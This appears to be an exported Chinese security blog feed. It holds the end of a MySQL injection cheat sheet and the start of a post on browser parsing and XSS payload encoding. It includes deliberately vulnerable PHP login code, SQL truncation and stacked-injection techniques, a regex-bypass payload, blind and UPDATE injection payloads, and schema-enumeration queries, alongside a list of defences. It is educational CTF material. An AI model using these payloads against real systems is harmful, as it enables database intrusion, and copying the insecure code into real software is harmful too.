id="常见全局变量"><a href="#常见全局变量" class="headerlink" title="常见全局变量"></a>常见全局变量</h3><table><thead><tr><th>变量</th><th>说明</th><th>变量</th><th>说明</th></tr></thead><tbody><tr><td>@@VERSION</td><td>返回版本信息</td><td>@@HOSTNAME</td><td>返回安装的计算机名称</td></tr><tr><td>@@GLOBAL.VERSION</td><td>同<code>@@VERSION</code></td><td>@@BASEDIR</td><td>返回MYSQL绝对路径</td></tr></tbody></table><p>PS：查看全部全局变量<code>SHOW GLOBAL VARIABLES;</code>。</p><h3 id="其他常用函数-语句"><a href="#其他常用函数-语句" class="headerlink" title="其他常用函数/语句"></a>其他常用函数/语句</h3><table><thead><tr><th>函数/语句</th><th>说明</th></tr></thead><tbody><tr><td>LENGTH(str)</td><td>返回字符串的长度。</td></tr><tr><td>PI()</td><td>返回π的具体数值。</td></tr><tr><td>REGEXP “statement”</td><td>正则匹配数据，返回值为布尔值。</td></tr><tr><td>LIKE “statement”</td><td>匹配数据，%代表任意内容。返回值为布尔值。</td></tr><tr><td>RLIKE “statement”</td><td>与regexp相同。</td></tr><tr><td>LOCATE(substr,str,[pos])</td><td>返回子字符串第一次出现的位置。</td></tr><tr><td>POSITION(substr IN str)</td><td>等同于 <code>LOCATE()</code>。</td></tr><tr><td>LOWER(str)</td><td>将字符串的大写字母全部转成小写。同：<code>LCASE(str)</code>。</td></tr><tr><td>UPPER(str)</td><td>将字符串的小写字母全部转成大写。同：<code>UCASE(str)</code>。</td></tr><tr><td>ELT(N,str1,str2,str3,…)</td><td>与<code>MAKE_SET(bit,str1,str2...)</code>类似，根据<code>N</code>返回参数值。</td></tr><tr><td>NULLIF(expr1,expr2)</td><td>若expr1与expr2相同，则返回expr1，否则返回NULL。</td></tr><tr><td>CHARSET(str)</td><td>返回字符串使用的字符集。</td></tr><tr><td>DECODE(<em>crypt_str</em>,<em>pass_str</em>)</td><td>使用 pass_str 作为密码，解密加密字符串 crypt_str。加密函数：<code>ENCODE(str,pass_str)</code>。</td></tr></tbody></table><h2 id="约束攻击"><a href="#约束攻击" class="headerlink" title="约束攻击"></a>约束攻击</h2><p>什么是约束攻击？</p><p>仍然是先举个例子：</p><p>我们先通过下列语句建立一个用户表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE users(</span><br><span class="line">username varchar(20),</span><br><span class="line">password varchar(20)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>注册代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&quot;127.0.0.1:3307&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;db&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = addslashes(@<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$password</span> = addslashes(@<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from users where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$rs</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rs</span>-&gt;fetch_row())&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;账号已注册&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$sql2</span> = <span class="string">&quot;insert into users values(&#x27;<span class="subst">$username</span>&#x27;,&#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line">    mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql2</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;注册成功&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>登录判断代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&quot;127.0.0.1:3307&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;db&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = addslashes(@<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$password</span> = addslashes(@<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from users where username = &#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$rs</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rs</span>-&gt;fetch_row())&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]=<span class="variable">$password</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在无编码问题，且进行了单引号的处理情况下仍可能发生什么SQL注入问题呢？</p><p>我们注意到，前边创建表格的语句限制了username和password的长度最大为25，若我们插入数据超过25，MYSQL会怎样处理呢？答案是MYSQL会截取前边的25个字符进行插入。</p><p>而对于<code>SELECT</code>查询请求，若查询的数据超过25长度，也不会进行截取操作，这就产生了一个问题。</p><p>通常对于注册处的代码来说，需要先判断注册的用户名是否存在，再进行插入数据操作。如我们注册一个<code>username=admin[25个空格]x&amp;password=123456</code>的账号，服务器会先查询<code>admin[25个空格]x</code>的用户是否存在，若存在，则不能注册。若不存在，则进行插入数据的操作。而此处我们限制了username与password字段长度最大为25，所以我们实际插入的数据为<code>username=admin[20个空格]&amp;password=123456</code>。</p><p>接着进行登录的时，我们使用：<code>username=admin&amp;password=123456</code>进行登录，即可成功登录admin的账号。</p><p>防御：</p><ul><li>给username字段添加unique属性。</li><li>使用id字段作为判断用户的凭证。</li><li>插入数据前判断数据长度。</li></ul><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>简单的说，由于分号<code>;</code>为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法执行其他恶意语句，如<code>RENAME</code>、<code>DROP</code>等。</p><p>注意，通常多语句执行时，若前条语句已返回数据，则之后的语句返回的数据通常无法返回前端页面。建议使用union联合注入，若无法使用联合注入， 可考虑使用<code>RENAME</code>关键字，将想要的数据列名/表名更改成返回数据的SQL语句所定义的表/列名 。具体参考：<a href="https://www.ctfwp.com/articals/2019qiangwang.html#随便注">2019强网杯——随便注Writeup</a></p><p>PHP中堆叠注入的支持情况：</p><table><thead><tr><th></th><th>Mysqli</th><th>PDO</th><th>MySQL</th></tr></thead><tbody><tr><td>引入的PHP版本</td><td>5.0</td><td>5.0</td><td>3.0之前</td></tr><tr><td>PHP5.x是否包含</td><td>是</td><td>是</td><td>是</td></tr><tr><td>多语句执行支持情况</td><td>是</td><td>大多数</td><td>否</td></tr></tbody></table><blockquote><p>引自：<a href="https://xz.aliyun.com/t/3950">PDO场景下的SQL注入探究</a></p></blockquote><h2 id="handler语句代替select查询"><a href="#handler语句代替select查询" class="headerlink" title="handler语句代替select查询"></a>handler语句代替select查询</h2><blockquote><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p></blockquote><p>语法结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name CLOSE</span><br></pre></td></tr></table></figure><p>如：通过handler语句查询users表的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">handler users open as yunensec; #指定数据表进行载入并将返回句柄重命名</span><br><span class="line">handler yunensec read first; #读取指定表&#x2F;句柄的首行数据</span><br><span class="line">handler yunensec read next; #读取指定表&#x2F;句柄的下一行数据</span><br><span class="line">handler yunensec read next; #读取指定表&#x2F;句柄的下一行数据</span><br><span class="line">...</span><br><span class="line">handler yunensec close; #关闭句柄</span><br></pre></td></tr></table></figure><h2 id="一些小Trick"><a href="#一些小Trick" class="headerlink" title="一些小Trick"></a>一些小Trick</h2><p>这里跟大家分享一些有意思的Trick，主要在一些CTF题出现，这里也把它记下来，方便复习。</p><h3 id="PHP-union-select-ig绕过。"><a href="#PHP-union-select-ig绕过。" class="headerlink" title="PHP/union.+?select/ig绕过。"></a>PHP<code>/union.+?select/ig</code>绕过。</h3><p>在某些题目中，题目禁止union与select同时出现时，会用此正则来判断输入数据。</p><ul><li><p>利用点：<a href="https://bugs.php.net/bug.php?id=70699">PHP正则回溯BUG</a></p></li><li><p>具体分析文章：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p></li></ul><blockquote><p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。若我们输入的数据使得PHP进行回溯且此数超过了规定的回溯上限此数(默认为 100万)，那么正则停止，返回未匹配到数据。</p></blockquote><p>故而我们构造payload：<code>union/*100万个a，充当垃圾数据*/select</code>即可绕过正则判断。</p><p>一道相关的CTF题：<a href="https://github.com/MrR3boot/CTF/tree/master/TetCTF-2020">TetCTF-2020 WP BY MrR3boot</a></p><h3 id="无列名盲注"><a href="#无列名盲注" class="headerlink" title="无列名盲注"></a>无列名盲注</h3><p>前边提到了，在知道表名，不知道列名的情况下，我们可以利用<code>union</code>来给未知列名“重命名”，还可以利用报错函数来注入出列名。现在，除了之前的<code>order by</code>盲注之外，这里再提一种新的方法，直接通过select进行盲注。</p><p>核心payload：<code>(select &#39;admin&#39;,&#39;admin&#39;)&gt;(select * from users limit 1)</code></p><p>子查询之间也可以直接通过<code>&gt;、&lt;、=</code>来进行判断。</p><h3 id="UPDATE注入重复字段赋值"><a href="#UPDATE注入重复字段赋值" class="headerlink" title="UPDATE注入重复字段赋值"></a>UPDATE注入重复字段赋值</h3><p>即：<code>UPDATA table_name set field1=new_value,field1=new_value2 [where]</code>，最终<code>field1</code>字段的内容为<code>new_value2</code>，可用这个特性来进行UPDATA注入。如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE table_name set field1&#x3D;new_value,field1&#x3D;(select user()) [where]</span><br></pre></td></tr></table></figure><h3 id="LIMIT之后的字段数判断"><a href="#LIMIT之后的字段数判断" class="headerlink" title="LIMIT之后的字段数判断"></a>LIMIT之后的字段数判断</h3><p>我们都知道若注入点在where子语句之后，判断字段数可以用<code>order by</code>或<code>group by</code>来进行判断，而<code>limit</code>后可以利用 <code>into @,@</code> 判断字段数，其中@为mysql临时变量。</p><p><img src="https://img.0x002.com/article/MysqlSQLi/limitInto.png" alt=""></p><h2 id="sys系统库"><a href="#sys系统库" class="headerlink" title="sys系统库"></a>sys系统库</h2><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#查询所有的库：</span><br><span class="line">SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;</span><br><span class="line">SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;</span><br><span class="line">#查询指定库的表（若无则说明此表从未被访问）：</span><br><span class="line">SELECT table_name FROM sys.schema_table_statistics WHERE table_schema&#x3D;&#39;mspwd&#39; GROUP BY table_name;</span><br><span class="line">SELECT table_name FROM  sys.x$schema_flattened_keys WHERE table_schema&#x3D;&#39;mspwd&#39; GROUP BY table_name;</span><br><span class="line">#统计所有访问过的表次数:库名,表名,访问次数</span><br><span class="line">select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group by table_schema,table_name order by io desc;</span><br><span class="line">#查看所有正在连接的用户详细信息:连接的用户(连接的用户名,连接的ip),当前库,用户状态(Sleep就是空闲),现在在执行的sql语句,上一次执行的sql语句,已经建立连接的时间(秒)</span><br><span class="line">SELECT user,db,command,current_statement,last_statement,time FROM sys.session;</span><br><span class="line">#查看所有曾连接数据库的IP,总连接次数</span><br><span class="line">SELECT host,total_connections FROM sys.host_summary;</span><br></pre></td></tr></table></figure><p>节选自：<a href="https://www.t00ls.net/thread-54783-1-1.html">Mysql的奇淫技巧(黑科技)</a></p></blockquote><table><thead><tr><th>视图-&gt;列名</th><th>说明</th></tr></thead><tbody><tr><td>host_summary -&gt; host、total_connections</td><td>历史连接IP、对应IP的连接次数</td></tr><tr><td>innodb_buffer_stats_by_schema -&gt; object_schema</td><td>库名</td></tr><tr><td>innodb_buffer_stats_by_table -&gt; object_schema、object_name</td><td>库名、表名(可指定)</td></tr><tr><td>io_global_by_file_by_bytes -&gt; file</td><td>路径中包含库名</td></tr><tr><td>io_global_by_file_by_latency -&gt; file</td><td>路径中包含库名</td></tr><tr><td>processlist -&gt; current_statement、last_statement</td><td>当前数据库正在执行的语句、该句柄执行的上一条语句</td></tr><tr><td>schema_auto_increment_columns -&gt; table_schema、table_name、column_name</td><td>库名、表名、列名</td></tr><tr><td>schema_index_statistics -&gt; table_schema、table_name</td><td>库名、表名</td></tr><tr><td>schema_object_overview -&gt; db</td><td>库名</td></tr><tr><td>schema_table_statistics -&gt; table_schema、table_name</td><td>库名、表名</td></tr><tr><td>schema_table_statistics_with_buffer -&gt; table_schema、table_name</td><td>库名、表名</td></tr><tr><td>schema_tables_with_full_table_scans -&gt; object_schema、object_name</td><td>库名、表名(全面扫描访问)</td></tr><tr><td>session -&gt; current_statement、last_statement</td><td>当前数据库正在执行的语句、该句柄执行的上一条语句</td></tr><tr><td>statement_analysis -&gt; query、db</td><td>数据库最近执行的请求、对于请求访问的数据库名</td></tr><tr><td>statements_with_* -&gt; query、db</td><td>数据库最近执行的特殊情况的请求、对应请求的数据库</td></tr><tr><td>version -&gt; mysql_version</td><td>mysql版本信息</td></tr><tr><td>x$innodb_buffer_stats_by_schema</td><td>同innodb_buffer_stats_by_schema</td></tr><tr><td>x$innodb_buffer_stats_by_table</td><td>同innodb_buffer_stats_by_table</td></tr><tr><td>x$io_global_by_file_by_bytes</td><td>同io_global_by_file_by_bytes</td></tr><tr><td>……</td><td>同……</td></tr><tr><td>x$schema_flattened_keys -&gt; table_schema、table_name、index_columns</td><td>库名、表名、主键名</td></tr><tr><td>x$ps_schema_table_statistics_io -&gt; table_schema、table_name、count_read</td><td>库名、表名、读取该表的次数</td></tr></tbody></table><p>差点忘了，还有mysql数据库也可以查询表名、库名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select table_name from mysql.innodb_table_stats where database_name&#x3D;database();</span><br><span class="line">select table_name from mysql.innodb_index_stats where database_name&#x3D;database();</span><br></pre></td></tr></table></figure><h1 id="Mysql注入防御"><a href="#Mysql注入防御" class="headerlink" title="Mysql注入防御"></a>Mysql注入防御</h1><ul><li>单引号闭合可控变量，并进行相应的转义处理</li><li>尽量使用预编译来执行SQL语句</li><li>采用白名单机制/完善黑名单</li><li>安装WAF防护软件</li><li>拒绝不安全的编码转换，尽量统一编码</li><li>关闭错误提示</li></ul><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>可能记得东西有点多导致很多内容都是精简过后的知识，其实本文可以当做字典一样来使用，可能讲得不是很细致，但是却方便我们进行复习，回想起脑海中的知识。文章花费了大量的笔墨在记录许多与Mysql注入相关的Trick，故而可能会显得比较杂乱，没有得到一个比较好的整理，可能对于不太了解Mysql注入的同学不太友好，望谅解。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://xz.aliyun.com/t/1719">【PHP代码审计】入门之路——第二篇-宽字节注入</a></li><li><a href="https://wooyun.js.org/drops/MySQL注入技巧.html">MySQL注入技巧</a></li><li><a href="https://blog.sari3l.com/posts/9622f295/">Mysql 注入基础小结</a></li><li><a href="https://www.t00ls.net/thread-54783-1-1.html">Mysql的奇淫技巧(黑科技)</a></li><li><a href="https://lightless.me/archives/read-mysql-client-file.html">Read MySQL Client’s File</a></li><li><a href="https://www.anquanke.com/post/id/98096">Dnslog在SQL注入中的实战</a></li><li><a href="https://www.freebuf.com/articles/web/154932.html">从安全角度深入理解MySQL编码转换机制</a></li><li><a href="https://dev.mysql.com/doc/refman/8.0/en/sys-schema-object-index.html">mysql sys Schema Object Index</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 原创栏目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>以浏览器解析机制来理解XSS载荷的编码转换</title>
      <link href="2019/%E4%BB%A5%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E6%9D%A5%E7%90%86%E8%A7%A3XSS%E8%BD%BD%E8%8D%B7%E7%9A%84%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2/"/>
      <url>2019/%E4%BB%A5%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E6%9D%A5%E7%90%86%E8%A7%A3XSS%E8%BD%BD%E8%8D%B7%E7%9A%84%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>之前在学习XSS的时候总感觉不是很系统，许多技巧背后原理都没有理解，光是会用罢了，如部分绕过编码技巧。<br>今天打算花时间来补补基础。</p><h1 id="0x00-基础知识"><a href="#0x00-基础知识" class="headerlink" title="0x00 基础知识"></a>0x00 基础知识</h1><h2 id="HTML基础"><a href="#HTML基础" class="headerlink" title="HTML基础"></a>HTML基础</h2><h3 id="常见的字符实体"><a href="#常见的字符实体" class="headerlink" title="常见的字符实体"></a>常见的字符实体</h3><p><img src="https://img.0x002.com/article/DeepXssEncode/b37056594a03dc5b464fb76119aa7286.png" alt=""></p><p>部分具有特定名称的字符实体<br>而对于其他没有特定名称的实体来说：</p><ul><li>十进制：对应符号的Ascii的值前加上&amp;#，后以;结尾</li><li>十六进制：对应符号的Ascii的值换算成16进制前加上&amp;#x，后以;结尾</li></ul><p>注意：字符实体解码后得到的值为字符串型，HTML解析器只将其当做字符串文本处理。</p><a id="more"></a><h3 id="HTML元素"><a href="#HTML元素" class="headerlink" title="HTML元素"></a>HTML元素</h3><p>共有5种元素：<strong>空元素</strong>、<strong>原始文本元素</strong>、<strong>RCDATA元素</strong>、<strong>外来元素</strong>以及<strong>常规元素</strong>。</p><ul><li>空元素：area、base、br、col、command、embed、hr、img、input、keygen、link、meta、param、source、track、wbr</li><li>原始文本元素：script、style</li><li>RCDATA元素：textarea、title</li><li>外来元素：来自MathML命名空间和SVG命名空间的元素。</li><li>常规元素：其他HTML允许的元素都称为常规元素。</li></ul><p>原始文本、RCDATA以及常规元素都有一个开始标签来表示开始，一个结束标签来表示结束。某些元素的开始和结束标签是可以省略的，如果规定标签不能被省略，那么就绝对不能省略它。空元素只有一个开始标签，且不能为空元素设置结束标签。外来元素可以有一个开始标签和配对的结束标签，或者只有一个自闭合的开始标签，且后者情况下该元素不能有结束标签。</p><h4 id="元素内容限制"><a href="#元素内容限制" class="headerlink" title="元素内容限制"></a>元素内容限制</h4><p>空元素不能有任何内容（因为空元素没有结束标签，自然没办法在开始标签和结束标签之间放内容）。<br>原始文本元素只可以包含文本<br>RCDATA元素可以包含文本和字符引用，但是文本中不能包含意义不明的符号。<br>对于外来元素，当开始标签自闭合时，不能包含任何内容（因为没有结束标签，所以不能在开始标签和结束标签之间放内容）。当开始标签不自闭合时，其内容可以包含文本、字符引用、CDATA块、其他元素和注释，但是文本不能包含编码为U+003C的小于符号（&lt;）或者意义不明的符号。</p><h2 id="浏览器显示页面流程："><a href="#浏览器显示页面流程：" class="headerlink" title="浏览器显示页面流程："></a>浏览器显示页面流程：</h2><p>先逐行加载页面，并将引用的外部文件下载下来-&gt;接着逐行解析页面，解析一部分后会将已解析的部分进行渲染，实现边解析边渲染。</p><h2 id="浏览器解析机制"><a href="#浏览器解析机制" class="headerlink" title="浏览器解析机制"></a>浏览器解析机制</h2><blockquote><p>一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个’&lt;’符号（后面没有跟’/‘符号）就会进入”标签开始状态(Tag open state)”。然后转变到”标签名状态(Tag name state)”，”前属性名状态(before attribute name state)”……最后进入”数据状态(Data state)” 并释放当前标签的token。当解析器处于”数据状态(Data state)”时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。</p></blockquote><p>引自：<a href="http://bobao.360.cn/learning/detail/292.html">深入理解浏览器解析机制和XSS向量编码</a></p><h3 id="1-标签a解析例子"><a href="#1-标签a解析例子" class="headerlink" title="1.标签a解析例子"></a>1.标签a解析例子</h3><p><code>&lt;a href=&quot;http://www.0x002.com&quot;&gt;0x002&lt;/a&gt;</code></p><h4 id="1）起始标签a"><a href="#1）起始标签a" class="headerlink" title="1）起始标签a"></a>1）起始标签a</h4><p>范围：<code>&lt;a href=&quot;http://www.0x002.com&quot;&gt;</code></p><p><strong>DataState</strong>：碰到<code>&lt;</code>,进入TagOpenState状态</p><p><strong>TagOpenState</strong>：碰到<code>a</code>,进入TagNameState状态（HTMLToken的type为StartTag）</p><p><strong>TagNameState</strong>：碰到空格，进入BeforeAttributeNameState状态（HTMLToken的m_data为a）</p><p><strong>BeforeAttributeNameState</strong>：碰到<code>h</code>,进入AttributeNameState状态</p><p><strong>AttributeNameState</strong>：碰到<code>=</code>，进入BeforeAttributeValueState状态（HTMLToken属性列表中加入一个属性，属性名为href)</p><p><strong>BeforeAttributeValueState</strong>: 碰到<code>&quot;</code>，进入AttributeValueDoubleQuotedState状态</p><p><strong>AttributeValueDoubleQuotedState</strong>：碰到<code>b</code>，保持状态，提取属性值</p><p><strong>AttributeValueDoubleQuotedState</strong>：碰到<code>&quot;</code>，进入AfterAttributeValueQuotedState(HTMLToken当前属性的值为<a href="http://www.0x002.com)">http://www.0x002.com)</a>.</p><p><strong>AfterAttributeValueQuotedState</strong>: 碰到<code>&gt;</code>，进入DataState，完成解析。</p><p>在完成startTag的解析的时候，会在解析器中存储与之匹配的end标签（m_appropriateEndTagName），等到解析end标签的时候，会同它进行匹配（语法解析的时候）。</p><p>html，body起始标签类似a起始标签，但没有属性解析</p><h4 id="2-a元素内容"><a href="#2-a元素内容" class="headerlink" title="2)a元素内容"></a>2)a元素内容</h4><p><strong>DataState</strong>：0x002</a>，碰到<code>0</code>,维持原状态，提取元素内容(HTMLToken的type为character)。</p><p><strong>DataState</strong>：0x002</a>，碰到<code>&lt;</code>,完成解析，不consume’&lt;’。(HTMLToken的m_data为w3c)。</p><h4 id="3）a结束标签"><a href="#3）a结束标签" class="headerlink" title="3）a结束标签"></a>3）a结束标签</h4><p><strong>DataState</strong>：0x002</a>，碰到<code>&lt;</code>,进入TagOpenState。</p><p><strong>TagOpenState</strong>：0x002</a>，碰到<code>/</code>,进入到EndTagOpenState。（HTMLToken的type为endTag）。</p><p><strong>EndTagOpenState</strong>：0x002</a>，碰到<code>a</code>,进入到TagNameState。</p><p><strong>TagNameState</strong>：0x002</a>，碰到<code>&gt;</code>,进入到DataState，完成解析。</p><p>这部分设计到状态机的知识，与解析原理有关。</p><p>为什么要讲这部分呢？因为他与接下来要讲的XSS载荷字符实体编码有关。</p><p>HTML解析器，部分标签在完成解析时，会按照节点类型、节点属性等生成不同的解析器去完成接下来的工作。</p><p>如a标签的href属性，HTML解析器会生成一个Url解析器去解析里边的内容。</p><p>对于<code>&lt;script&gt;</code>，HTML解析器生成JS解析器去执行标签内容，执行时HTML解析器阻塞、渲染阻塞，等待执行完毕后恢复。</p><p><img src="https://img.0x002.com/article/DeepXssEncode/cefa0a81f7748dc3e9506feb66200c74.png" alt="浏览器处理HTML文档主要流程"></p><h1 id="0x02-各种编码讲解"><a href="#0x02-各种编码讲解" class="headerlink" title="0x02 各种编码讲解"></a>0x02 各种编码讲解</h1><h2 id="1-字符实体编码"><a href="#1-字符实体编码" class="headerlink" title="1.字符实体编码"></a>1.字符实体编码</h2><p>解码操作在HTML解析器中。</p><p>有三种情况可以容纳字符实体，”数据状态中的字符引用”，”RCDATA状态中的字符引用”和”属性值状态中的字符引用”。在这些状态中HTML字符实体将会从<code>&amp;#...</code>形式解码，对应的解码字符会被放入数据缓冲区中。例如，在问题4中，”&lt;”和”&gt;”字符被编码为<code>&amp;#60;</code>和<code>&amp;#62;</code>。当解析器解析完<code>&lt;div&gt;</code>并处于”数据状态”时，这两个字符将会被解析。当解析器遇到<code>&amp;</code>字符，它会知道这是”数据状态的字符引用”，因此会消耗一个字符引用（例如”&#60;”）并释放出对应字符的token。在这个例子中，对应字符指的是<code>&lt;</code>和<code>&gt;</code>。读者可能会想：这是不是意味着<code>&lt;</code>和<code>&gt;</code>的token将会被理解为标签的开始和结束，然后其中的脚本会被执行？答案是脚本并不会被执行。原因是解析器在解析这个字符引用后不会转换到”标签开始状态”。正因为如此，就不会建立新标签。因此，我们能够利用字符实体编码这个行为来转义用户输入的数据从而确保用户输入的数据只能被解析成”数据”。</p><p>简单的说，字符实体编码仅在下列几种情况适用：</p><ul><li>标签内容(不包括原始文本元素，如<code>&lt;script&gt;</code>): <code>&lt;&gt;[在这]&lt;/&gt;</code></li><li>RCDATA元素内容中(<code>&lt;textarea&gt;、&lt;title&gt;</code>)：<code>&lt;&gt;[在这]&lt;/&gt;</code></li><li>标签属性值内容：<code>&lt;xx xx=&quot;[在这]&quot;&gt;(&lt;/xx&gt;)</code></li></ul><h2 id="2-URL编码"><a href="#2-URL编码" class="headerlink" title="2.URL编码"></a>2.URL编码</h2><p>解码操作在URL解析器中</p><p>例子：</p><p>对于<code>&lt;a href=&quot;javascript:alert%281%29&quot;&gt;&lt;/a&gt;</code>来说：HTML解析后，把<code>javascript:alert(1)</code>发送给URL解析器，此时URL解析器会先寻找<code>:</code>冒号，以确定该内容的协议。如未找到或无法确定，则默认为http协议，本例中为javascript协议。Url解析器会将协议冒号后边(若无冒号或无法确定协议，则解码的群体为全部内容)的字符全部进行一次url解码，即对alert%281%29进行URL解码，得到alert(1)。</p><h2 id="3-Unicode编码"><a href="#3-Unicode编码" class="headerlink" 